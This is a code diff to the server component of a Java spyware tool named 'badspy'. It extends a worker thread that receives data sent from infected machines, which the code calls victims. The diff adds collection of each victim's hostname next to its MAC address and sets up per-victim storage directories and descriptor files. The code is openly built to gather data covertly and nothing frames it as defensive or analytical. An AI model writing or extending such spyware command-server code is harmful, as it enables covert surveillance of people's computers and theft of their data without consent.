@@ -2,8 +2,10 @@ package com.blogspot.sontx.badspy.badserver.bo.worker;
 
 import com.blogspot.sontx.badspy.badserver.Config;
 import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
+import com.blogspot.sontx.badspy.badserver.bo.SpyDscFile;
 import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
 import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
+import com.blogspot.sontx.jini.INIBadFormatException;
 import com.blogspot.sontx.jlog.Log;
 
 import java.io.Closeable;
@@ -20,6 +22,7 @@ public class SpyWorker extends Thread implements Closeable {
     private SpyReader reader;
     private SpyWriter writer;
     private File victimDir = null;
+    private SpyDscFile dscFile = null;
     private OnCompletedListener mOnCompletedListener = null;
 
     public void setOnCompletedListener(OnCompletedListener listener) {
@@ -54,16 +57,34 @@ public class SpyWorker extends Thread implements Closeable {
             case SpyDataHeader.HEADER_MAC:
                 receiveMAC(header.getContentLength());
                 break;
+            case SpyDataHeader.HEADER_HOSTNAME:
+                receiveHostName(header.getContentLength());
+                break;
         }
+    }
+
+    private void receiveHostName(int contentLength) throws IOException {
+        if (dscFile == null) {
+            Log.e("Not determine spy version");
+            return;
+        }
+        Log.i("Receiving hostname...");
+        SpyHostNameReceiver receiver = new SpyHostNameReceiver(reader,writer, contentLength, dscFile);
+        receiver.start();
     }
 
     private void receiveMAC(int contentLength) throws IOException {
         Log.i("Receiving MAC address...");
         SpyMACReceiver receiver = new SpyMACReceiver(reader, writer, contentLength);
         receiver.start();
-        Log.i(String.format("Received MAC address, victim ID is %s", receiver.getVictimDir()));
-        if (receiver.getVictimDir() != null)
+        if (receiver.getVictimDir() != null) {
             this.victimDir = new File(Config.WORKING_DIR, receiver.getVictimDir());
+            try {
+                dscFile = new SpyDscFile(new File(victimDir, "version0").getPath());
+            } catch (INIBadFormatException e) {
+                e.printStackTrace();
+            }
+        }
     }
 
     private void receiveFile(int contentLength) throws IOException {
